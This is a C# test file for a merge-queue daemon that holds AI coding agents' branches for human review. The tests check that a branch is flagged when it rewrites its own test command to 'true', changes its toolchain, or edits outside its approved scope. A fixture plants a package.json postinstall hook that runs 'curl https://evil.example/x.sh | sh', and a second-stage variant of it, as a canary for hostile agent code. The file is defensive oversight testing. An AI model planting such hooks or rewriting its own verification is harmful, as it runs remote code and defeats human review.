using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using LibGit2Sharp;
using Mainguard.Agents.Agents;
using Mainguard.Agents.Agents.Orchestrator;
using Mainguard.Agents.Agents.Sandbox;
using Mainguard.Git.Exceptions;
using Mainguard.Git.Review;
using Xunit;

namespace Mainguard.Tests;

/// <summary>
/// MG-10 / MG-11 (2) — the daemon-side queue factory, over a REAL bare mirror and a REAL agent branch.
///
/// <para><see cref="VerificationCommandResolver"/> shipped complete and had <b>no production caller at
/// all</b>: the review cockpit built its context with the 4-argument constructor, leaving
/// <c>ChangedTestCommand = false</c> forever, so in the running app a branch that rewrote its own test
/// command to something that always passes produced no flag and merged unremarked. RT-D2 exists precisely
/// to stop a branch self-greening. Resolving the command here — at verification time, from the two committed
/// trees, daemon-side — is what makes the flag fire, and what pins the provenance into the immutable
/// verification record.</para>
/// </summary>
public sealed class MergeQueueProvisionerTests : IDisposable
{
    private const string AgentId = "loom-rtd2";
    private const string ContainerId = "container-rtd2";

    /// <summary>The two co-tenants of the keep-alive tests: one merges, the other must survive it.</summary>
    private const string FirstAgent = "loom-first";
    private const string SecondAgent = "loom-second";

    private readonly string _vmRoot = NewDir("mainguard-mqprov-vm-");
    private readonly string _source = NewDir("mainguard-mqprov-src-");
    private readonly Mainguard.Git.Audit.InMemoryAuditLog _audit = new();

    [Fact]
    public async Task BranchThatRewritesItsOwnTestCommand_IsFlagged_AndCannotMerge()
    {
        // main's baseline runs the real suite; the branch rewrites it to something that always passes.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "true");

        var provisioner = NewProvisioner(exitCode: 0, out _);
        var ctx = provisioner.EnsureQueue(repoHash);
        Assert.NotNull(ctx);

        var record = await ctx!.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        // The provenance is resolved from the BRANCH tree and recorded immutably (RT-D2 ResolvedCommand +
        // ConfigHash) — that is the evidence a reviewer reads to see what actually ran.
        Assert.Equal("true", record.ResolvedCommand);
        Assert.Equal(VerificationCommandResolver.Sha256("true\n"), record.ConfigHash);
        Assert.True(record.Passed); // it "passes" — which is exactly why the drift has to be flagged.

        // ...and the drift blocks the merge until a human acknowledges it.
        Assert.True(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("test command changed", reason);

        ctx.ChangedTestCommand.Acknowledge(AgentId);
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    /// <summary>
    /// L4, the plumbing half: the two committed config trees are the ONLY place the baseline and the
    /// replacement exist together, so if the provisioner does not hand them to the gate, the
    /// acknowledgment record can never say what was waived — only that something was.
    ///
    /// <para>Asserted through the real mirror rather than by handing the gate a literal: a
    /// <c>SetFlagged</c> that dropped the drift argument would still flag, still block, and still clear on
    /// acknowledgment, and every other assertion in this class would stay green. This is the one that
    /// notices.</para>
    /// </summary>
    [Fact]
    public async Task TheWaiverRecord_NamesTheBaselineAndTheReplacement_ReadFromTheMirror()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "true");

        var provisioner = NewProvisioner(exitCode: 0, out _);
        var ctx = provisioner.EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.True(ctx.ChangedTestCommand!.Acknowledge(AgentId, "owner@example"));

        var waiver = Assert.Single(
            provisioner.AuditLog.Read(),
            e => e.Type == "acknowledged_flagged_change"
                 && e.Fields.GetValueOrDefault("item") == ChangedTestCommandGate.TestCommandItem);

        Assert.Equal(MergeQueueProvisioner.VerificationConfigPath, waiver.Fields["path"]);
        Assert.Equal("npm test", waiver.Fields["from"]);
        Assert.Equal("true", waiver.Fields["to"]);
        Assert.Equal("owner@example", waiver.Fields["by"]);
    }

    [Fact]
    public async Task BranchThatLeavesTheTestCommandAlone_IsNotFlagged()
    {
        // The control: identical config on both sides must NOT flag, or the gate is just noise that
        // trains people to acknowledge without reading.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var provisioner = NewProvisioner(exitCode: 0, out var engine);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.Equal("npm test", record.ResolvedCommand);
        Assert.False(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));

        // The command ran in the AGENT'S OWN JAIL, argv-style — host execution is a rejection trigger.
        Assert.Equal(ContainerId, engine.LastContainerId);
        Assert.Equal(new[] { "npm", "test" }, engine.LastCommand);
    }

    // ---- F2: the branch's merge state, reported back onto the agent ------
    //
    // A coordinator's ONLY window onto its fan-out is `get_worker_status` (contract §3), which reads the
    // agent session's state word. That word was written once, by the sandbox attach ("Working"), and no
    // merge outcome ever moved it — so a coordinator whose worker had committed, verified green and
    // reached `Verified` still reported "Working ... actively working", permanently. A status that cannot
    // ever say "done" makes a coordinator structurally unable to report the completion of its own work.

    /// <summary>
    /// The whole point: a green run reaches the AGENT, in the queue's own words, in order.
    /// </summary>
    [Fact]
    public async Task AGreenVerification_ReportsVerifying_ThenVerified_OnTheAgentItself()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var supervisor = new RecordingSupervisor();
        var ctx = NewRebasingProvisioner(out _, _ => ContainerId, supervisor).EnsureQueue(repoHash)!;

        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
        Assert.True(record.Passed);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));

        // Both transitions, in the order the state machine made them — not just the final word. A report
        // that only ever lands on the terminal state cannot tell a coordinator that anything is happening.
        Assert.Equal(
            new[] { nameof(WorkerMergeState.Verifying), nameof(WorkerMergeState.Verified) },
            supervisor.Marks.Where(m => m.Agent == AgentId).Select(m => m.State).ToArray());

        // …and it carries the sentence a human reads, which is what makes the state actionable rather
        // than a word to look up.
        var verified = supervisor.Marks.Last(m => m.State == nameof(WorkerMergeState.Verified));
        Assert.Contains("waiting for a human to review", verified.Reason);
    }

    /// <summary>
    /// The paired negative, and the one that matters most: a RED run must not tell a coordinator its
    /// worker is done — and since H2 it must not tell it the worker is merely still working either.
    ///
    /// <para>This assertion used to read <c>Working</c>, which is the word an UNVERIFIED branch reports.
    /// A coordinator's only window onto its fan-out is this state word plus its sentence
    /// (<c>get_worker_status</c>, contract §3), so with the two collapsed a coordinator was structurally
    /// unable to learn that its worker's tests had failed. The sentence is asserted alongside the word for
    /// the same reason it is asserted for <c>Verified</c> above: the word is a label, and the sentence is
    /// what makes it actionable.</para>
    /// </summary>
    [Fact]
    public async Task AFailedVerification_NeverReportsVerified_AndTellsTheAgentTheTestsFailed()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var supervisor = new RecordingSupervisor();
        var ctx = NewRebasingProvisioner(out _, _ => ContainerId, supervisor, exitCode: 1)
            .EnsureQueue(repoHash)!;

        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
        Assert.False(record.Passed);
        Assert.Equal(WorkerMergeState.VerificationFailed, ctx.Queue.GetState(AgentId));

        Assert.DoesNotContain(supervisor.Marks, m => m.State == nameof(WorkerMergeState.Verified));
        Assert.Equal(
            new[] { nameof(WorkerMergeState.Verifying), nameof(WorkerMergeState.VerificationFailed) },
            supervisor.Marks.Where(m => m.Agent == AgentId).Select(m => m.State).ToArray());

        var failed = supervisor.Marks.Last(m => m.State == nameof(WorkerMergeState.VerificationFailed));
        Assert.Contains("FAILED", failed.Reason);
        Assert.DoesNotContain("Back at work", failed.Reason);
    }

    [Fact]
    public async Task AFailingRealExit_LeavesTheBranchUnmergeable()
    {
        // OPS SA-1: pass/fail is the container-runtime exit the engine reports, and nothing else.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var ctx = NewProvisioner(exitCode: 1, out _).EnsureQueue(repoHash)!;
        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(record.Passed);
        // H2 — a real container exit of 1 lands the entry on the state that says so, and the gate reason
        // is the verdict rather than "not verified yet".
        Assert.Equal(WorkerMergeState.VerificationFailed, ctx.Queue.GetState(AgentId));
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("FAILED", reason);
        Assert.Contains("npm test", reason);
    }

    // ---- P2-11 flagged-change gate, wired into the daemon's merge spine --
    //
    // The gate shipped complete and was constructed in exactly one non-test place: ReviewCockpitViewModel's
    // LOCAL composition branch, which the shipped app never takes (it always supplies `live`). It was never
    // registered in DaemonHost, never passed to MergeQueue's `gates`, and never consulted by CanMerge — so
    // the entire human-diff-review boundary was evaluated by nothing in the running daemon. These tests run
    // through the production MergeQueueProvisioner over a REAL bare mirror and a REAL agent branch, because
    // the defect was never in the detector: it was in the wiring, and only wiring-level tests can see it.

    [Fact]
    public async Task BranchThatPoisonsPackageJson_IsFlagged_AndCannotMerge_UntilAcknowledged()
    {
        // The canary: hostile agent code lands as a `postinstall` that runs arbitrary shell at install
        // time. The branch VERIFIES GREEN — the poisoned script is not what the test command runs — which
        // is exactly why the merge decision cannot be left to the verification result alone.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
        CommitPoisonedPackageJson(repoHash);

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.True(record.Passed);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));

        // Verified, green, and NOT mergeable — the flagged-change gate blocks it.
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("acknowledgment", reason);

        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
        var poisoned = Assert.Single(store.Items, i => i.Path == "package.json");
        Assert.Equal(RiskCategory.ExecutableConfig, poisoned.Category);
        Assert.Equal(FlaggedKind.RiskCategory, poisoned.Kind);

        // Item-by-item: acknowledging THIS item is what opens the gate. There is no "ack all".
        Assert.True(store.Acknowledge(poisoned.Id));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    [Fact]
    public async Task BranchOutsideItsApprovedScope_IsFlagged_AndCannotMerge_UntilAcknowledged()
    {
        // SA-1/F6 — the contract's "load-bearing field". The plan was approved for docs work only; the
        // branch edits source. Note the file's own category is benign (Source), so nothing about the change
        // is suspicious in isolation — the ONLY thing that makes it flag-worthy is the approved scope, which
        // is precisely the comparison that was being performed against nothing.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var plan = PlanScopedTo("docs/**");
        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
            resolveApprovedPlan: id => id == AgentId ? plan : null).EnsureQueue(repoHash)!;

        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
        Assert.True(record.Passed);

        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("acknowledgment", reason);

        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
        var outOfScope = Assert.Single(store.Items, i => i.Kind == FlaggedKind.OutOfApprovedScope);
        Assert.Equal("feature.cs", outOfScope.Path);
        Assert.Contains("outside approved scope", outOfScope.Detail);

        Assert.True(store.Acknowledge(outOfScope.Id));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    [Fact]
    public async Task BranchInsideItsApprovedScope_IsNotFlagged()
    {
        // The negative control that keeps the test above honest. Same branch, same detector, same wiring —
        // only the approved scope differs, so a failure here means the scope comparison is not the thing
        // producing the flag. Without this, a gate that blocked EVERY branch would pass the test above.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var plan = PlanScopedTo("**/*.cs");
        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
            resolveApprovedPlan: id => id == AgentId ? plan : null).EnsureQueue(repoHash)!;

        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.Empty(ctx.FlaggedChanges!.PeekStore(AgentId)!.Items);
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    [Fact]
    public async Task ANewPayloadOnTheBranch_ResetsAnAcknowledgmentAndBlocksAgain()
    {
        // Invariant 2: an acknowledgment binds to the flagged set's CONTENT HASH. Arming the gate at
        // verification time is what makes that real in the daemon — a branch that acquires an ack and then
        // lands different bytes must not carry the ack across, or "reviewed" means "was reviewed once".
        //
        // The re-verification here is triggered the way production triggers it: a co-tenant's merge moves
        // main, the stale cascade fires, and (requeue == null) the branch re-runs its own verification. So
        // this exercises the real re-entry path rather than a hand-driven second call the state machine
        // would not have permitted anyway (Verified → Verifying is an illegal transition).
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");
        CommitPoisonedPackageJson(repoHash);

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        var store = ctx.FlaggedChanges!.PeekStore(AgentId)!;
        var firstPayload = store.Items.Single(i => i.Path == "package.json");
        Assert.True(store.Acknowledge(firstPayload.Id));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));

        // The agent lands a DIFFERENT poisoned payload; main moves; the branch re-verifies.
        CommitPoisonedPackageJson(repoHash, payload: "curl https://evil.example/second-stage.sh | sh");
        ctx.Queue.NotifyMainMoved("main-sha-moved-by-a-co-tenant");
        await ctx.Queue.LastCascade;

        // The new bytes produce a new content hash, so the ack that covered the old ones is gone.
        var second = Assert.Single(ctx.FlaggedChanges.PeekStore(AgentId)!.Items, i => i.Path == "package.json");
        Assert.NotEqual(firstPayload.ContentHash, second.ContentHash);
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("acknowledgment", reason);
    }

    [Fact]
    public async Task AGreenBranchWhoseReviewCouldNotRun_IsDenied()
    {
        // MG-40 fail-closed, at the wiring level, and the assertion is deliberately made on a branch that
        // is otherwise PERFECTLY mergeable: Verified, green, no drift. The only thing wrong with it is that
        // its diff could not be classified. "No acknowledgment record" and "reviewed and came back clean"
        // are indistinguishable from inside the gate, so the review failing must deny rather than install an
        // empty (== fully acknowledged) set — the review failing open is the whole bug class.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        CommitOnAgentBranch(repoHash, branchVerifyCommand: "npm test");

        var ctx = NewProvisioner(exitCode: 0, out _, new MergeQueueRegistry(), exitFor: null,
            resolveApprovedPlan: null, mergeDiff: new UncomputableDiffService()).EnsureQueue(repoHash)!;

        var record = await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        // Verification itself is untouched — conflating "the review broke" with "the tests failed" is the
        // one distinction the merge decision rests on.
        Assert.True(record.Passed);
        Assert.Equal(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));

        Assert.Null(ctx.FlaggedChanges!.PeekStore(AgentId));
        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("flagged-change review has not run", reason);

        // ...and nothing about READING the gate may create the record that would have let it through.
        Assert.Null(ctx.FlaggedChanges.PeekStore(AgentId));
    }

    /// <summary>A diff service that cannot answer — the "no mirror / no such branch / git fell over" shape.</summary>
    private sealed class UncomputableDiffService : IMergeBranchDiffService
    {
        public MergeBranchDiff Compute(string repoHash, string agentId) =>
            throw new InvalidOperationException("the mirror does not carry this branch");
    }

    /// <summary>An approved plan whose scope is exactly <paramref name="scope"/> (SA-1/F6 comparison input).</summary>
    private static TaskPlan PlanScopedTo(params string[] scope) => new(
        PlanId: "plan-" + Guid.NewGuid().ToString("N"),
        Title: "scoped work",
        Scope: scope,
        Approach: "do the scoped work",
        TestStrategy: "npm test",
        BudgetUsd: 1m,
        DraftedAt: DateTimeOffset.UtcNow);

    /// <summary>Lands a package.json on the agent branch whose <c>scripts</c> block runs arbitrary shell at
    /// install time — the P2-11 canary for hostile agent code that verifies green.</summary>
    private void CommitPoisonedPackageJson(string repoHash, string payload = "curl https://evil.example/x.sh | sh")
    {
        // The agent worktree already exists (CommitOnAgentBranch created it) — resolve it rather than
        // re-creating, so this lands as a further commit on the SAME branch the daemon will diff.
        var worktree = new WorktreeManager(_vmRoot).WorktreePathFor(repoHash, AgentId);
        WriteAndCommit(worktree, "package.json",
            "{\n  \"name\": \"app\",\n  \"scripts\": {\n    \"build\": \"tsc\",\n"
            + $"    \"postinstall\": \"{payload}\"\n  }}\n",
            "add build tooling");
    }

    // ---- per-repo toolchain declaration (MG-42) --------------------------
    //
    // Every claim below is its OWN test on purpose. xUnit stops a test at its first failing assertion,
    // so a five-assertion test measures assertion one and merely asserts the rest; when each of these
    // was re-run against a deliberately broken resolver, the split is what showed WHICH control had
    // stopped working rather than just that something had.

    /// <summary>
    /// <b>The security property.</b> A branch that edits <c>.mainguard/toolchain</c> does not get its
    /// toolchain installed — main's is. The observable is which presence probe the daemon ran in the
    /// jail: main declares <c>dotnet-10</c>, the branch demands <c>rust-stable</c>, and the daemon must
    /// probe <c>dotnet --version</c> and never <c>cargo --version</c>.
    ///
    /// <para>This is the assertion that separates "we flagged the install" from "we never did the
    /// install". Flagging alone would be worthless here: the package would already have run its install
    /// scripts as root, inside the jail, before any human saw the diff.</para>
    /// </summary>
    [Fact]
    public async Task ABranchsToolchain_IsNeverTheOneProvisioned()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out var engine).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        var probed = engine.Commands.Select(c => string.Join(' ', c)).ToList();
        Assert.Contains("dotnet --version", probed);
        Assert.DoesNotContain("cargo --version", probed);
    }

    /// <summary>The branch's toolchain edit arms the RT-D2 gate.</summary>
    [Fact]
    public async Task BranchThatChangesTheToolchain_IsFlagged()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.True(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
    }

    /// <summary>...and the armed gate actually blocks the merge, naming the toolchain specifically —
    /// a reason that said "test command" would send the reviewer to the wrong file.</summary>
    [Fact]
    public async Task BranchThatChangesTheToolchain_CannotMerge_AndTheReasonNamesTheToolchain()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("verification toolchain changed vs main", reason, StringComparison.Ordinal);
    }

    /// <summary>The gate is a gate, not a wall: a human acknowledgment clears it.</summary>
    [Fact]
    public async Task AcknowledgingTheToolchainChange_UnblocksTheMerge()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);
        Assert.False(ctx.Queue.CanMerge(AgentId, out _));

        ctx.ChangedTestCommand!.Acknowledge(AgentId);
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    /// <summary>
    /// Adding a declaration where main has none is drift too. Without this the cheapest attack — a repo
    /// that declares nothing, a branch that adds a line — would be the one case that sailed through.
    /// </summary>
    [Fact]
    public async Task BranchThatAddsAToolchainWhereMainHasNone_IsFlagged()
    {
        var repoHash = SeedAndProvision("npm test"); // no main-side toolchain at all
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "dotnet-10");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.True(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
    }

    /// <summary>
    /// The post-merge mirror refresh (observed-live defect): after a confirmed human merge, origin's
    /// main has moved but the mirror's hasn't — and EnsureQueue's reconcile TRUSTS the mirror, so a
    /// spawn in that window walked the queue's authoritative main BACKWARDS to the pre-merge sha.
    /// Every later verification was then coherent against the old main and every merge refused with
    /// "main moved". The refresh pulls origin's main forward into the mirror at confirm time, so the
    /// reconcile agrees with the merge instead of undoing it.
    /// </summary>
    [Fact]
    public void RefreshMirrorMainAfterMerge_PullsOriginForward_SoEnsureQueueCannotRegressMain()
    {
        var repoHash = SeedAndProvision("npm test");
        var provisioner = NewProvisioner(exitCode: 0, out _);
        var shaBefore = provisioner.EnsureQueue(repoHash)!.Queue.CurrentMainSha;

        // The human's merge lands on ORIGIN's main; the mirror knows nothing yet.
        WriteAndCommit(_source, "merged.cs", "public class Merged { }\n", "the human merge landing on origin main");
        string newMain;
        using (var origin = new Repository(_source))
        {
            newMain = origin.Head.Tip.Sha;
        }

        Assert.NotEqual(shaBefore, newMain);

        Assert.True(provisioner.TryRefreshMirrorMainAfterMerge(repoHash, out var reason), reason);

        // The reconcile now moves FORWARD to the merged sha — before the refresh existed, this same
        // EnsureQueue call is what regressed the queue back to shaBefore.
        Assert.Equal(newMain, provisioner.EnsureQueue(repoHash)!.Queue.CurrentMainSha);
    }

    /// <summary>
    /// The control. Identical declarations on both sides must NOT flag — a gate that fires on every
    /// branch is noise, and noise trains reviewers to acknowledge without reading.
    /// </summary>
    [Fact]
    public async Task BranchThatLeavesTheToolchainAlone_IsNotFlagged()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "dotnet-10");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
        Assert.True(ctx.Queue.CanMerge(AgentId, out _));
    }

    /// <summary>A comment or a blank line is not toolchain drift; normalisation is real, not decorative.</summary>
    [Fact]
    public async Task AComment_IsNotToolchainDrift()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "# why we need this\n\ndotnet-10   # the SDK");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(ctx.ChangedTestCommand!.IsUnacknowledged(AgentId));
    }

    /// <summary>
    /// Both files drifting must produce BOTH items in the reason. A reason that mentioned only one
    /// would let a reviewer acknowledge what they read and merge what they did not.
    /// </summary>
    [Fact]
    public async Task CommandDriftAndToolchainDrift_AreBothNamed()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "true", branchToolchain: "rust-stable");

        var ctx = NewProvisioner(exitCode: 0, out _).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.False(ctx.Queue.CanMerge(AgentId, out var reason));
        Assert.Contains("test command", reason, StringComparison.Ordinal);
        Assert.Contains("verification toolchain", reason, StringComparison.Ordinal);
    }

    /// <summary>
    /// The failure mode that matters. A jail that does not actually carry the declared toolchain must
    /// raise a typed <see cref="ToolchainProvisioningException"/> and run NOTHING — never a
    /// <c>NoVerificationCommandException</c> ("nothing to check") and never an ordinary failed record
    /// ("the agent's code is broken"). Both of those read like verdicts.
    /// </summary>
    [Fact]
    public async Task AJailMissingItsDeclaredToolchain_IsATypedProvisioningFailure()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "dotnet-10");

        // The probe fails; every other exec would succeed.
        var provisioner = NewProvisioner(
            exitCode: 0, out var engine, new MergeQueueRegistry(),
            exitFor: cmd => cmd.Count > 0 && cmd[0] == "dotnet" ? 127 : 0);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        var ex = await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None));

        Assert.Contains("dotnet-10", ex.Message, StringComparison.Ordinal);
        // The verify command was never launched — a provisioning failure is not a test result.
        Assert.DoesNotContain("npm test", engine.Commands.Select(c => string.Join(' ', c)));
    }

    /// <summary>...and that failure leaves the branch unmergeable rather than quietly Verified.</summary>
    [Fact]
    public async Task AJailMissingItsDeclaredToolchain_LeavesTheBranchUnmergeable()
    {
        var repoHash = SeedAndProvision("npm test", mainToolchain: "dotnet-10");
        CommitOnAgentBranch(repoHash, "npm test", branchToolchain: "dotnet-10");

        var ctx = NewProvisioner(
            exitCode: 0, out _, new MergeQueueRegistry(),
            exitFor: cmd => cmd.Count > 0 && cmd[0] == "dotnet" ? 127 : 0).EnsureQueue(repoHash)!;

        await Assert.ThrowsAsync<ToolchainProvisioningException>(
            () => ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None));

        Assert.NotEqual(WorkerMergeState.Verified, ctx.Queue.GetState(AgentId));
        Assert.False(ctx.Queue.CanMerge(AgentId, out _));
    }

    /// <summary>
    /// A repo declaring nothing keeps behaving exactly as it did before this feature existed: no
    /// probes, no extra execs, straight to the verification command.
    /// </summary>
    [Fact]
    public async Task ARepoWithNoToolchainDeclaration_RunsNoProbes()
    {
        var repoHash = SeedAndProvision("npm test");
        CommitOnAgentBranch(repoHash, "npm test");

        var ctx = NewProvisioner(exitCode: 0, out var engine).EnsureQueue(repoHash)!;
        await ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None);

        Assert.Equal(new[] { "npm test" }, engine.Commands.Select(c => string.Join(' ', c)));
    }

    [Fact]
    public void EnsureQueue_RegistersTheRepo_AndIsIdempotent()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        var registry = new MergeQueueRegistry();
        var provisioner = NewProvisioner(exitCode: 0, out _, registry);

        Assert.Null(registry.Resolve(repoHash)); // empty until something makes the repo active

        var first = provisioner.EnsureQueue(repoHash);
        var second = provisioner.EnsureQueue(repoHash);

        Assert.NotNull(first);
        // Idempotent by identity, not just by outcome: a second queue over the same repo would be a second
        // state machine racing the first over one main branch.
        Assert.Same(first, second);
        Assert.Same(first, registry.Resolve(repoHash));
        Assert.Equal(MainSha(repoHash), first!.Queue.CurrentMainSha);
    }

    [Fact]
    public void EnsureQueue_ForAnUnprovisionedRepo_StaysAbsent()
    {
        // Honest absence: a handle with no mirror keeps resolving to NOT_FOUND rather than getting a queue
        // pinned to an unknown main, against which every record would look fresh.
        Assert.Null(NewProvisioner(exitCode: 0, out _).EnsureQueue("never-provisioned"));
    }

    [Fact]
    public void EnsureEntry_MakesTheAgentVisibleToTheQueue()
    {
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        var provisioner = NewProvisioner(exitCode: 0, out _, out var registry);

        provisioner.EnsureEntry(repoHash, AgentId, MergeEntryOrigin.Local);

        var ctx = registry.Resolve(repoHash);
        Assert.NotNull(ctx);
        Assert.Contains(AgentId, ctx!.Queue.Agents);
        Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(AgentId));
    }

    [Fact]
    public async Task AgentThatMovedItsWorkOffItsOwnBranch_IsRefusedWithTheMeasurement_NotVerifiedSilently()
    {
        // The defect, end to end, in the shape it was measured on the owner's machine: the worktree is
        // created on agent/<id>, the agent switches to another branch and commits there, and readiness is
        // then proposed.
        //
        // Asserting "the mirror's ref did not move" would prove nothing — that is true with or without the
        // fix, and it is exactly what made this invisible. What has to be asserted is that proposing the
        // work as ready now REPORTS the condition.
        var repoHash = SeedAndProvision(mainVerifyCommand: "npm test");
        var worktree = new WorktreeManager(_vmRoot).CreateAgentWorktree(repoHash, AgentId);
        StrandWorkOffTheAgentBranch(worktree);

        var provisioner = NewProvisioner(exitCode: 0, out var engine);
        var ctx = provisioner.EnsureQueue(repoHash)!;

        var refusal = await Assert.ThrowsAsync<InvalidOperationException>(
            () => ctx.Queue.RunVerificationAsync(AgentId, CancellationToken.None));

        // Names the branch found, the branch expected, and what to do — a cause, not just a symptom.
        Assert.Contains("stranded-work", refusal.Message, StringComparison.Ordinal);
        Assert.Contains("agent/" + AgentId, refusal.Message, StringComparison.Ordinal);
        Assert.Contains("merge queue", refusal.Message, StringComparison.Ordinal);
        Assert.Contains("git branch -f", refusal.Message, StringComparison.Ordinal);

        // Refused BEFORE anything ran in the jail: verifying an empty branch and reporting a pass is the
        // outcome that would let stranded work look finished.
        Assert.Empty(engine.Commands);

        // The queue surfaces the branch back to Working rather than leaving it wedged in Verifying.
        Assert.Equal(WorkerMergeState.Working, ctx.Queue.GetState(AgentId));
    }

    /// <summary>
